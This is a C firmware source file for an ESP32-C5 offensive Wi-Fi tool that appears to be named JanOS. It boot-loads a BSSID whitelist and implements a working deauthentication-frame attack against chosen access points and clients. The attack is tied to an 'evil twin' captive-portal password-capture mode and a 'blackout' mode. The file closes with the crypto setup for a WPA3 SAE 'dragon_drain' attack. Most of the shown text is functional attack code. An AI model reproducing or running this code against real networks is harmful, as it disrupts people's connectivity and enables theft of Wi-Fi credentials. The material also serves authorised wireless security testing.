Smethan/projectZero/ESP32C5/main/main.c
    // Load BSSID whitelist from SD card
    if (sd_init_ret == ESP_OK) {
        load_whitelist_from_sd();
    } else {
        whitelistedBssidsCount = 0;
    }
    vTaskDelay(pdMS_TO_TICKS(500));
    MY_LOG_INFO(TAG,"BOARD READY");
    oled_display_update_full("> JanOS v" JANOS_VERSION,
                            sd_init_ret == ESP_OK ? "  SD: OK" : "  SD: MISSING!",
                            "",
                            "  > Ready _");
    vTaskDelay(pdMS_TO_TICKS(100));
    
}

void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count) {   
    if (applicationState == EVIL_TWIN_PASS_CHECK ) {
        ESP_LOGW(TAG, "Deauth stop requested in Evil Twin flow, checking for password, will do nothing here..");
        return;
    }

    //proceed with deauth frames on channels of the APs:
    // Use target_bssids[] directly to avoid index confusion after periodic re-scan
    for (int i = 0; i < target_bssid_count; ++i) {
        if (applicationState == EVIL_TWIN_PASS_CHECK ) {
            ESP_LOGW(TAG, "Checking for password...");
            return;
        }
        
        // Check for stop request
        if (operation_stop_requested) {
            ESP_LOGW(TAG, "Deauth: Stop requested, terminating...");
            return;
        }

        if (!target_bssids[i].active) continue;
        
        // Check if BSSID is whitelisted - but ONLY during blackout attack, not during regular deauth
        if (blackout_attack_active && is_bssid_whitelisted(target_bssids[i].bssid)) {
            // MY_LOG_INFO(TAG, "Skipping whitelisted BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
            //            target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
            //            target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5]);
            continue;
        }
        
        // During evil twin with connected clients, only attack networks on same channel as first selected network
        if ((applicationState == DEAUTH_EVIL_TWIN) && portal_connected_clients > 0 && target_bssid_count > 0) {
            uint8_t first_network_channel = target_bssids[0].channel; // First selected network's channel
            if (target_bssids[i].channel != first_network_channel) {
                // Skip networks on different channels when clients are connected
                continue;
            }
            // Only send deauth on same channel - no channel switch needed since we're already on this channel
        }
        
        // Enhanced logging to debug BSSID mismatch issue
        // MY_LOG_INFO(TAG, "DEAUTH: Sending to SSID: %s, CH: %d, BSSID: %02X:%02X:%02X:%02X:%02X:%02X (target_bssids[%d])",
        //         target_bssids[i].ssid, target_bssids[i].channel,
        //         target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
        //         target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5], i);
        
        // If no clients connected or not evil twin mode, do normal channel hopping
        if (portal_connected_clients == 0 || applicationState != DEAUTH_EVIL_TWIN) {
            vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
            esp_wifi_set_channel(target_bssids[i].channel, WIFI_SECOND_CHAN_NONE );
            vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
        }

        // If stations are selected AND we're in regular DEAUTH mode (not evil_twin/blackout), send targeted deauth
        if (selected_stations_count > 0 && applicationState == DEAUTH) {
            for (int s = 0; s < selected_stations_count; s++) {
                if (!selected_stations[s].active) continue;
                
                uint8_t deauth_frame[sizeof(deauth_frame_default)];
                memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
                // Set destination to specific station (not broadcast!)
                memcpy(&deauth_frame[4], selected_stations[s].mac, 6);
                memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
                memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
                wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
            }
        } else {
            // Broadcast deauth (original behavior)
            uint8_t deauth_frame[sizeof(deauth_frame_default)];
            memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
            memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
            memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
            wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        }
        
        // If clients are connected during evil twin, immediately return to first network's channel
        // This ensures we're on the correct channel when clients try to connect to the portal
        if ((applicationState == DEAUTH_EVIL_TWIN) && portal_connected_clients > 0 && target_bssid_count > 0) {
            uint8_t first_network_channel = target_bssids[0].channel;
            esp_wifi_set_channel(first_network_channel, WIFI_SECOND_CHAN_NONE);
        }
    }
    
    // After sending all deauth frames, always return to first network's channel during evil twin
    // This maximizes probability of being on correct channel when clients try to connect
    if ((applicationState == DEAUTH_EVIL_TWIN) && target_bssid_count > 0) {
        uint8_t first_network_channel = target_bssids[0].channel;
        esp_wifi_set_channel(first_network_channel, WIFI_SECOND_CHAN_NONE);
    }

}

//SAE WPA3 attack methods:

static int trng_random_callback(void *ctx, unsigned char *output, size_t len) {
    (void)ctx;
    esp_fill_random(output, len);
    return 0;
}

static int crypto_init(void) {
    int ret;
#if HAS_MBEDTLS_CTR_DRBG
    const char *pers = "dragon_drain";
    mbedtls_ctr_drbg_init(&ctr_drbg);

    // TRNG as entropy source
    ret = mbedtls_ctr_drbg_seed(&ctr_drbg,
                             trng_random_callback,
                             NULL,
                             (const unsigned char *) pers, strlen(pers));

    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ctr_drbg_seed failed: %d", ret);
        return ret;
    }
#endif

    mbedtls_ecp_group_init(&ecc_group);
    mbedtls_ecp_point_init(&ecc_element);
    mbedtls_mpi_init(&ecc_scalar);

    ret = mbedtls_ecp_group_load(&ecc_group, MBEDTLS_ECP_DP_SECP256R1);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ecp_group_load failed: %d", ret);
        return ret;
    }

    ESP_LOGI(TAG, "Crypto context initialized with TRNG (secp256r1)");
    return 0;
}

